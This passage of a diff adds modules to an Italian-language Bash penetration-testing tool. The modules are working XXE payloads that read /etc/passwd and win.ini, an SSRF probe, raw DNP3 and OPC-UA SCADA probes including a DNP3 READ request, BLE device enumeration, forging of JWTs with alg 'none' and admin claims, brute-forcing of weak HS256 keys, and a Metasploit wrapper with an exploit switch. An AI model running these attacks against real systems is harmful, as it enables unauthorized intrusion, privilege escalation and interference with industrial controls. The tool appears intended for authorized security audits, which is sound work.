+    local _xxe_param='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>'
+    local _xxe_win='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+    local _xxe_svr='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>'
+
+    # Endpoint XML/SOAP comuni
+    local -a _xml_endpoints=(
+        "/" "/api" "/soap" "/ws" "/service" "/rpc" "/xml"
+        "/api/v1" "/api/v2" "/webservice" "/services"
+        "/ProvisioningServer" "/provisioning" "/config"
+    )
+    local -a _ct_types=("application/xml" "text/xml" "application/soap+xml")
+
+    section "XXE — Probe su endpoint XML/SOAP"
+    local _xxe_found=0
+    if [[ $DRY_RUN -eq 0 ]]; then
+        for _ep in "${_xml_endpoints[@]}"; do
+            for _ct in "${_ct_types[@]}"; do
+                local _resp
+                _resp=$(curl -s $insecure --max-time 8 -X POST \
+                    -H "Content-Type: ${_ct}" \
+                    -d "$_xxe_basic" \
+                    "${base_url}${_ep}" 2>/dev/null | head -50 || true)
+                echo "=== POST ${_ep} [${_ct}] ===" >> "$OUTDIR/xxe_probe.txt"
+                echo "$_resp" | head -20             >> "$OUTDIR/xxe_probe.txt"
+                if echo "$_resp" | grep -qE "root:|daemon:|nobody:|bin:|/bin/bash|/sbin/nologin"; then
+                    found CRITICAL "XXE confermato — lettura /etc/passwd via ${_ep} [${_ct}]"
+                    echo "$_resp" >> "$OUTDIR/xxe_confirmed.txt"
+                    _xxe_found=1
+                elif echo "$_resp" | grep -qi "for 16-bit app support\|extensions\|MCI"; then
+                    found HIGH "XXE confermato — lettura win.ini via ${_ep} [${_ct}]"
+                    _xxe_found=1
+                elif echo "$_resp" | grep -qiE "xml.*error|entity.*not.*allowed|DOCTYPE.*disallowed"; then
+                    found LOW "XXE — entità esterne bloccate su ${_ep} (protezione attiva)"
+                fi
+            done
+        done
+
+        # Test SVR (SSRF via XXE)
+        local _resp_svr
+        _resp_svr=$(curl -s $insecure --max-time 8 -X POST \
+            -H "Content-Type: application/xml" \
+            -d "$_xxe_svr" \
+            "${base_url}/" 2>/dev/null | head -20 || true)
+        if echo "$_resp_svr" | grep -qiE "html|http|connection|server"; then
+            found HIGH "XXE SSRF — richiesta a 127.0.0.1 via entità esterna riflessa"
+        fi
+
+        [[ $_xxe_found -eq 0 ]] && log "XXE: nessuna vulnerabilità rilevata"
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} XXE probe: ${#_xml_endpoints[@]} endpoint x ${#_ct_types[@]} content-types su $base_url"
+    fi
+
+    ok "XXE audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: opcua — OPC-UA Industrial Protocol
+# ============================================================
+usage_opcua() {
+    echo "Uso: exa-dune opcua TARGET [OPTIONS]"
+    echo ""
+    echo "  Audit OPC-UA (Industrial IoT): rilevamento server, test anonymous access,"
+    echo "  enumeration namespace e nodi base."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta OPC-UA (default: 4840)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_opcua() {
+    local target="" port=4840
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_opcua; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_opcua; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_opcua; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "opcua"
+    log "Target: $target:$port | Output: $OUTDIR"
+
+    section "OPC-UA — nmap scan :$port"
+    run_cmd "nmap_opcua" \
+        "nmap -p $port -sV --script opcua-info \
+         -oN \"$OUTDIR/nmap_opcua.nmap\" $target 2>/dev/null"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if grep -qi "opc\|opc.ua\|open" "$OUTDIR/nmap_opcua.nmap" 2>/dev/null; then
+            found MEDIUM "OPC-UA:$port — server identificato via nmap"
+        fi
+    fi
+
+    section "OPC-UA — Banner probe :$port"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if check_port "$target" "$port"; then
+            # OPC-UA TCP transport: HEL message
+            local _hel_msg
+            _hel_msg=$(printf 'HEL\x00\x00\x00\x00\x00\xf0\x00\x00\x00\xf0\x00\x00\x00\xf0\x00\x00\x00\x00\x00\x00\x00' | \
+                timeout 6 nc -w 5 "$target" "$port" 2>/dev/null | xxd | head -5 || true)
+            echo "$_hel_msg" > "$OUTDIR/opcua_banner.txt"
+            if [[ -n "$_hel_msg" ]]; then
+                found HIGH "OPC-UA:$port — server risponde al HEL message"
+                # Controlla se risponde con ACK (0x41 43 4b = "ACK")
+                echo "$_hel_msg" | grep -qi "ACK\|4143 4b" && \
+                    found CRITICAL "OPC-UA:$port — handshake riuscito (anonymous access possibile)"
+            fi
+        else
+            warn "Porta $port chiusa — OPC-UA non raggiungibile"
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} OPC-UA HEL message probe su $target:$port"
+    fi
+
+    section "OPC-UA — Python opcua client (se disponibile)"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if python3 -c "import opcua" 2>/dev/null; then
+            EXA_OPCUA_TARGET="opc.tcp://${target}:${port}" python3 - <<'PYEOF' 2>/dev/null \
+                > "$OUTDIR/opcua_nodes.txt" || true
+import os, sys
+try:
+    from opcua import Client
+    url = os.environ.get('EXA_OPCUA_TARGET', 'opc.tcp://localhost:4840')
+    c = Client(url)
+    c.connect()
+    root = c.get_root_node()
+    print(f"Connected: {url}")
+    print(f"Root node: {root}")
+    children = root.get_children()
+    for ch in children[:20]:
+        print(f"  {ch}")
+    c.disconnect()
+    print("Anonymous access: SUCCESS")
+except Exception as e:
+    print(f"Connection failed: {e}")
+PYEOF
+            grep -qi "Anonymous access: SUCCESS" "$OUTDIR/opcua_nodes.txt" 2>/dev/null && \
+                found CRITICAL "OPC-UA:$port — accesso anonymous riuscito (opcua python client)"
+        else
+            log "python3-opcua non disponibile — installa: pip3 install opcua"
+        fi
+    fi
+
+    ok "OPC-UA audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: dnp3 — DNP3 (SCADA/ICS)
+# ============================================================
+usage_dnp3() {
+    echo "Uso: exa-dune dnp3 TARGET [OPTIONS]"
+    echo ""
+    echo "  Audit DNP3 (SCADA): rilevamento outstation, test accesso non autenticato,"
+    echo "  function code scan su porta 20000."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta DNP3 (default: 20000)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_dnp3() {
+    local target="" port=20000
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_dnp3; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_dnp3; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_dnp3; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "dnp3"
+    log "Target: $target:$port | Output: $OUTDIR"
+
+    section "DNP3 — nmap scan :$port"
+    run_cmd "nmap_dnp3" \
+        "nmap -p $port --script dnp3-info -sV \
+         -oN \"$OUTDIR/nmap_dnp3.nmap\" $target 2>/dev/null"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        grep -qi "dnp3\|outstation\|master\|DNP" "$OUTDIR/nmap_dnp3.nmap" 2>/dev/null && \
+            found HIGH "DNP3:$port — dispositivo SCADA rilevato via nmap"
+    fi
+
+    section "DNP3 — Raw probe :$port"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if check_port "$target" "$port"; then
+            # DNP3 Data Link Layer frame: START=0x0564, LEN=5, CTL=0xC4, DST=1, SRC=4, CRC
+            local _dnp3_frame
+            _dnp3_frame=$(printf '\x05\x64\x05\xC4\x01\x00\x04\x00\xF3\x53' | \
+                timeout 6 nc -w 5 "$target" "$port" 2>/dev/null | xxd | head -5 || true)
+            echo "$_dnp3_frame" > "$OUTDIR/dnp3_raw_response.txt"
+            if [[ -n "$_dnp3_frame" ]]; then
+                found CRITICAL "DNP3:$port — risposta al frame raw (accesso senza autenticazione)"
+                # Prova READ request (FC=1) per leggere tutti gli oggetti
+                local _dnp3_read
+                _dnp3_read=$(printf '\x05\x64\x08\xC4\x01\x00\x04\x00\xC0\xC1\x01\x3C\x01\x06\xFF\xFF' | \
+                    timeout 6 nc -w 5 "$target" "$port" 2>/dev/null | xxd | head -10 || true)
+                echo "$_dnp3_read" > "$OUTDIR/dnp3_read_response.txt"
+                [[ -n "$_dnp3_read" ]] && found CRITICAL "DNP3:$port — READ request accettata (oggetti leggibili)"
+            else
+                log "DNP3: nessuna risposta al frame raw (porta aperta ma non DNP3 o auth richiesta)"
+            fi
+        else
+            warn "Porta $port chiusa — DNP3 non raggiungibile"
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} DNP3 raw frame probe su $target:$port (Data Link Layer + READ request)"
+    fi
+
+    ok "DNP3 audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: ble — Bluetooth Low Energy
+# ============================================================
+usage_ble() {
+    echo "Uso: exa-dune ble [OPTIONS]"
+    echo ""
+    echo "  Scan Bluetooth Low Energy: rileva dispositivi nell'area,"
+    echo "  enumera servizi GATT, identifica IoT/dispositivi noti."
+    echo ""
+    echo "Opzioni:"
+    echo "  --iface IFACE    Interfaccia BT (default: hci0)"
+    echo "  --timeout N      Durata scan in secondi (default: 15)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_ble() {
+    local iface="hci0" scan_timeout=15
+    # BLE non richiede TARGET (scan passivo)
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --iface)   _req_arg "$1" "${2:-}"; iface="$2";       shift 2 ;;
+            --timeout) _req_arg "$1" "${2:-}"; scan_timeout="$2"; shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --help|-h) usage_ble; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_ble; exit 1 ;;
+            *)         shift ;; # ignora argomenti posizionali
+        esac
+    done
+    check_root
+    # Setup directory output senza target
+    local _ble_out="${OUTDIR_BASE:-/root/pentest/ble_$(date +%Y%m%d_%H%M%S)}"
+    mkdir -p "$_ble_out"
+    log "BLE scan su $iface | Output: $_ble_out"
+
+    section "BLE — Verifica adapter"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if ! command -v hciconfig &>/dev/null && ! command -v bluetoothctl &>/dev/null; then
+            warn "hciconfig/bluetoothctl non trovati — installa: apt install bluez"
+            ok "BLE scan saltato"; return
+        fi
+        local _hci_info
+        _hci_info=$(hciconfig "$iface" 2>/dev/null || true)
+        echo "$_hci_info" > "$_ble_out/hci_info.txt"
+        if ! echo "$_hci_info" | grep -qi "UP RUNNING\|RUNNING"; then
+            warn "Adapter $iface non attivo — provo ad attivarlo..."
+            hciconfig "$iface" up 2>/dev/null || true
+        fi
+        log "Adapter: $(echo "$_hci_info" | grep -oP 'BD Address: \K\S+' | head -1 || echo 'n/d')"
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} hciconfig $iface up && hcitool lescan --passive (${scan_timeout}s)"
+        return
+    fi
+
+    section "BLE — Scan passivo (${scan_timeout}s)"
+    local _ble_scan_file="$_ble_out/ble_scan.txt"
+    timeout "$scan_timeout" hcitool -i "$iface" lescan --passive 2>/dev/null \
+        > "$_ble_scan_file" || true
+    local _dev_count
+    _dev_count=$(grep -cE '^([0-9A-F]{2}:){5}[0-9A-F]{2}' "$_ble_scan_file" 2>/dev/null || echo 0)
+    if [[ "$_dev_count" -gt 0 ]]; then
+        found HIGH "BLE — $_dev_count dispositivo/i Bluetooth Low Energy nel range"
+        grep -E '^([0-9A-F]{2}:){5}[0-9A-F]{2}' "$_ble_scan_file" | sort -u | \
+            head -20 > "$_ble_out/ble_devices.txt"
+
+        section "BLE — Info dispositivi"
+        while IFS= read -r _dev_line; do
+            local _addr _name
+            _addr=$(echo "$_dev_line" | awk '{print $1}')
+            _name=$(echo "$_dev_line" | cut -d' ' -f2- | tr -d '\r\n' || true)
+            log "  Dispositivo: $_addr ${_name:+(${_name})}"
+            # Info device
+            hcitool -i "$iface" info "$_addr" 2>/dev/null \
+                >> "$_ble_out/ble_device_info.txt" || true
+            # GATT services enumeration con gatttool
+            if command -v gatttool &>/dev/null; then
+                timeout 10 gatttool -b "$_addr" --primary 2>/dev/null \
+                    >> "$_ble_out/gatt_${_addr//:/_}.txt" || true
+                if [[ -s "$_ble_out/gatt_${_addr//:/_}.txt" ]]; then
+                    found MEDIUM "BLE GATT — servizi enumerati su $_addr"
+                    local _srv_count
+                    _srv_count=$(wc -l < "$_ble_out/gatt_${_addr//:/_}.txt" || echo 0)
+                    log "    GATT: $_srv_count servizi"
+                fi
+            fi
+        done < "$_ble_out/ble_devices.txt"
+    else
+        log "BLE: nessun dispositivo rilevato nel range"
+    fi
+
+    section "BLE — bluetoothctl scan"
+    if command -v bluetoothctl &>/dev/null; then
+        # Scan con bluetoothctl
+        timeout "$scan_timeout" bluetoothctl -- scan on 2>/dev/null | \
+            grep -E "Device|NEW|Controller" > "$_ble_out/bluetoothctl_scan.txt" || true
+        grep -c "NEW\|Device" "$_ble_out/bluetoothctl_scan.txt" 2>/dev/null | \
+            read -r _bctl_count || _bctl_count=0
+        [[ "${_bctl_count:-0}" -gt 0 ]] && \
+            found MEDIUM "BLE bluetoothctl — $_bctl_count entry rilevate"
+    fi
+
+    ok "BLE scan completato → $_ble_out"
+}
+
+# ============================================================
+#  MODULO: jwt — JWT Attack
+# ============================================================
+usage_jwt() {
+    echo "Uso: exa-dune jwt TARGET [OPTIONS]"
+    echo ""
+    echo "  Cerca e attacca JWT: algoritmo 'none', chiavi HS256 deboli,"
+    echo "  confusione RS256→HS256, claim injection."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta HTTP (default: 80)"
+    echo "  --scheme SCHEME  http|https (default: http)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_jwt() {
+    local target="" port=80 scheme="http"
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_jwt; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_jwt; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_jwt; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "jwt"
+    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"
+
+    local base_url="${scheme}://${target}:${port}"
+    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
+
+    section "JWT — Ricerca token nelle risposte HTTP"
+    local _jwt_found=""
+    if [[ $DRY_RUN -eq 0 ]]; then
+        # Cerca JWT in risposta root e endpoint comuni
+        local -a _endpoints=("/" "/api" "/api/v1" "/api/v2" "/auth" "/login" "/token" "/health")
+        for _ep in "${_endpoints[@]}"; do
+            local _resp _hdrs
+            _resp=$(curl -s $insecure --max-time 8 -D "$OUTDIR/headers_${_ep//\//_}.txt" \
+                "${base_url}${_ep}" 2>/dev/null || true)
+            _hdrs=$(cat "$OUTDIR/headers_${_ep//\//_}.txt" 2>/dev/null || true)
+            # Cerca JWT in header (Authorization, Set-Cookie) e body
+            local _jwt_candidate
+            _jwt_candidate=$(echo "${_resp}${_hdrs}" | \
+                grep -oP 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -3 || true)
+            if [[ -n "$_jwt_candidate" ]]; then
+                _jwt_found="$_jwt_candidate"
+                echo "$_jwt_candidate" >> "$OUTDIR/jwt_tokens_found.txt"
+                found MEDIUM "JWT trovato su ${_ep}"
+                log "  JWT (prime 50 char): ${_jwt_candidate:0:50}..."
+                # Controlla se JWT su HTTP (non HTTPS)
+                [[ "$scheme" == "http" ]] && \
+                    found HIGH "JWT trasmesso su HTTP non cifrato"
+            fi
+        done
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} JWT search su ${#_endpoints[@]} endpoint di $base_url"
+        return
+    fi
+
+    if [[ -z "$_jwt_found" ]]; then
+        log "JWT: nessun token trovato nelle risposte HTTP"
+        ok "JWT audit completato → $OUTDIR"; return
+    fi
+
+    section "JWT — Decode e analisi claims"
+    local _jwt="$_jwt_found"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        EXA_JWT_TOKEN="$_jwt" python3 - <<'PYEOF' 2>/dev/null >> "$OUTDIR/jwt_decoded.txt" || true
+import os, base64, json
+token = os.environ.get('EXA_JWT_TOKEN', '')
+parts = token.split('.')
+if len(parts) >= 2:
+    for i, part in enumerate(parts[:2]):
+        pad = 4 - len(part) % 4
+        part += '=' * (pad % 4)
+        try:
+            decoded = json.loads(base64.urlsafe_b64decode(part))
+            print(f"Part {i} ({'header' if i==0 else 'payload'}): {json.dumps(decoded, indent=2)}")
+        except Exception as e:
+            print(f"Part {i}: decode error: {e}")
+PYEOF
+        if [[ -s "$OUTDIR/jwt_decoded.txt" ]]; then
+            log "JWT claims:"
+            cat "$OUTDIR/jwt_decoded.txt" | head -20 | while IFS= read -r _l; do log "  $_l"; done || true
+            # Controlla algoritmo
+            grep -qi '"alg".*"none"' "$OUTDIR/jwt_decoded.txt" 2>/dev/null && \
+                found CRITICAL "JWT — algoritmo 'none' nel token (firma bypassata)"
+            grep -qi '"alg".*"HS256"' "$OUTDIR/jwt_decoded.txt" 2>/dev/null && \
+                log "  Algoritmo: HS256 (testare chiave debole)"
+        fi
+    fi
+
+    section "JWT — Test algoritmo 'none'"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        EXA_JWT_TOKEN="$_jwt" python3 - <<'PYEOF' 2>/dev/null > "$OUTDIR/jwt_none_token.txt" || true
+import os, base64, json
+token = os.environ.get('EXA_JWT_TOKEN', '')
+parts = token.split('.')
+if len(parts) >= 2:
+    try:
+        hdr_raw = parts[0] + '=' * (4 - len(parts[0]) % 4 % 4)
+        hdr = json.loads(base64.urlsafe_b64decode(hdr_raw))
+        hdr['alg'] = 'none'
+        new_hdr = base64.urlsafe_b64encode(json.dumps(hdr, separators=(',', ':')).encode()).rstrip(b'=').decode()
+        pld_raw = parts[1] + '=' * (4 - len(parts[1]) % 4 % 4)
+        pld = json.loads(base64.urlsafe_b64decode(pld_raw))
+        # Modifica claim per escalation
+        if 'role' in pld: pld['role'] = 'admin'
+        if 'admin' in pld: pld['admin'] = True
+        if 'is_admin' in pld: pld['is_admin'] = True
+        new_pld = base64.urlsafe_b64encode(json.dumps(pld, separators=(',', ':')).encode()).rstrip(b'=').decode()
+        print(f"{new_hdr}.{new_pld}.")
+    except Exception as e:
+        print(f"error: {e}")
+PYEOF
+        local _none_token; _none_token=$(cat "$OUTDIR/jwt_none_token.txt" 2>/dev/null || true)
+        if [[ -n "$_none_token" ]] && ! echo "$_none_token" | grep -qi "error"; then
+            # Testa il token modificato
+            local _none_resp _none_code
+            _none_code=$(curl -s $insecure -o /dev/null -w "%{http_code}" --max-time 5 \
+                -H "Authorization: Bearer ${_none_token}" \
+                "${base_url}/api/v1/users" 2>/dev/null || echo "000")
+            if [[ "$_none_code" == "200" ]]; then
+                found CRITICAL "JWT — algoritmo 'none' accettato! Escalation privilege riuscita"
+            fi
+        fi
+    fi
+
+    section "JWT — Brute-force chiave HS256"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        local -a _weak_keys=("secret" "password" "123456" "key" "jwt" "jwt_secret"
+                              "supersecret" "changeme" "mysecret" "token" "auth"
+                              "$target" "admin" "1234567890" "qwerty" "letmein")
+        for _k in "${_weak_keys[@]}"; do
+            EXA_JWT_TOKEN="$_jwt" EXA_JWT_KEY="$_k" python3 - <<'PYEOF' 2>/dev/null \
+                > "$OUTDIR/jwt_bruteforce_result.txt" || true
+import os, hmac, hashlib, base64
+token = os.environ.get('EXA_JWT_TOKEN', '')
+key = os.environ.get('EXA_JWT_KEY', '')
+parts = token.split('.')
+if len(parts) >= 3 and parts[2]:
+    msg = f"{parts[0]}.{parts[1]}".encode()
+    sig = hmac.new(key.encode(), msg, hashlib.sha256).digest()
+    b64sig = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
+    if b64sig == parts[2]:
+        print(f"FOUND key={key}")
+    else:
+        print(f"no key={key}")
+PYEOF
+            if grep -qi "FOUND" "$OUTDIR/jwt_bruteforce_result.txt" 2>/dev/null; then
+                found CRITICAL "JWT — chiave HS256 debole trovata: '${_k}'"
+                break
+            fi
+        done
+    fi
+
+    ok "JWT audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: msf — Metasploit Integration
+# ============================================================
+usage_msf() {
+    echo "Uso: exa-dune msf TARGET [OPTIONS]"
+    echo ""
+    echo "  Wrapper Metasploit: esegue 'check' sui moduli auxiliary più rilevanti"
+    echo "  in base alle porte aperte. Non esegue exploit — solo verifica."
+    echo ""
+    echo "Opzioni:"
+    echo "  --ports LIST     Porte aperte separate da spazi (es: '22 80 445')"
+    echo "  --exploit        Esegui exploit (default: solo check)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_msf() {
+    local target="" open_ports_arg="" do_exploit=0
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --ports)   _req_arg "$1" "${2:-}"; open_ports_arg="$2"; shift 2 ;;
+            --exploit) do_exploit=1;            shift ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_msf; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_msf; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_msf; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "msf"
+    log "Target: $target | Output: $OUTDIR"
+
+    if ! command -v msfconsole &>/dev/null; then
+        warn "msfconsole non trovato — installa: apt install metasploit-framework"
+        ok "MSF audit saltato"; return
+    fi
+
+    # Mappa porta → modulo auxiliary MSF
+    declare -A _port_module_map=(
+        [445]="auxiliary/scanner/smb/smb_ms17_010"
+        [3389]="auxiliary/scanner/rdp/ms12_020_maxchannelids"
+        [5900]="auxiliary/scanner/vnc/vnc_none_auth"
+        [6379]="auxiliary/scanner/redis/redis_login"
+        [1883]="auxiliary/scanner/mqtt/connect"
+        [623]="auxiliary/scanner/ipmi/ipmi_cipher_zero"
+        [5060]="auxiliary/scanner/sip/options_tcp"
+        [21]="auxiliary/scanner/ftp/anonymous"
+        [23]="auxiliary/scanner/telnet/telnet_login"
+        [161]="auxiliary/scanner/snmp/snmp_login"
+        [2049]="auxiliary/scanner/nfs/nfsmount"
+        [8080]="auxiliary/scanner/http/http_login"
+        [80]="auxiliary/scanner/http/http_login"
+    )
+
+    # Costruisce RC script con moduli rilevanti
+    local _rc_file="$OUTDIR/msf_check.rc"
+    {
+        echo "spool $OUTDIR/msf_output.txt"
+        local _mod_count=0
+        for _p in ${open_ports_arg:-445 80 21 23 161 5900 6379 1883 3389 623 5060}; do
+            local _mod="${_port_module_map[$_p]:-}"
+            [[ -z "$_mod" ]] && continue
+            echo "use $_mod"
+            echo "set RHOSTS $target"
+            echo "set RPORT $_p"
+            echo "set ConnectTimeout 8"
+            echo "set THREADS 1"
+            if [[ $do_exploit -eq 1 ]]; then
+                echo "run"
+            else
+                echo "check"
+            fi
+            echo "back"
+            ((_mod_count++)) || true
+        done
+        echo "exit"
+    } > "$_rc_file"
+
+    section "Metasploit — $(grep -c '^use ' "$_rc_file" 2>/dev/null || echo 0) moduli auxiliary"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        log "Esecuzione msfconsole (timeout 5 min)..."
+        timeout 300 msfconsole -q -r "$_rc_file" > /dev/null 2>&1 || true
+
+        if [[ -s "$OUTDIR/msf_output.txt" ]]; then
+            # Analizza output
+            grep -iE "appears to be vulnerable|is vulnerable|\[\+\].*success|login success" \
+                "$OUTDIR/msf_output.txt" 2>/dev/null | \
+                while IFS= read -r _l; do
+                    found CRITICAL "Metasploit: $_l"
+                done || true
+            grep -iE "\[!\].*not vulnerable|check failed" "$OUTDIR/msf_output.txt" 2>/dev/null | \
+                head -5 | while IFS= read -r _l; do log "  $_l"; done || true
+            local _vuln_count
+            _vuln_count=$(grep -ciE "vulnerable|success" "$OUTDIR/msf_output.txt" 2>/dev/null || echo 0)
+            log "MSF check completato — $vuln_count risultati positivi"
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} msfconsole -r $OUTDIR/msf_check.rc (check su porte: $open_ports_arg)"
+    fi
+
+    ok "MSF audit completato → $OUTDIR"
+}
+
+# ============================================================
 #  MAIN DISPATCHER
 # ============================================================
 [[ $# -eq 0 ]] && { cmd_help; exit 0; }
@@ -15027,6 +16266,17 @@ case "$subcommand" in
     voip-enum)      cmd_voip_enum     "$@" ;;
     config-audit)   cmd_config_audit  "$@" ;;
     history)        cmd_history       "$@" ;;
+    printer)        cmd_printer        "$@" ;;
+    amqp)           cmd_amqp           "$@" ;;
+    log4shell)      cmd_log4shell      "$@" ;;
+    sqli)           cmd_sqli           "$@" ;;
+    ssrf)           cmd_ssrf           "$@" ;;
+    xxe)            cmd_xxe            "$@" ;;
+    opcua)          cmd_opcua          "$@" ;;
+    dnp3)           cmd_dnp3           "$@" ;;
+    ble)            cmd_ble            "$@" ;;
+    jwt)            cmd_jwt            "$@" ;;
+    msf)            cmd_msf            "$@" ;;
     help|-h|--help) cmd_help "$@" ;;
     version|--version) echo "exa-dune $VERSION"; exit 0 ;;
     *) err "Subcommand sconosciuto: $subcommand"; cmd_help; exit 1 ;;
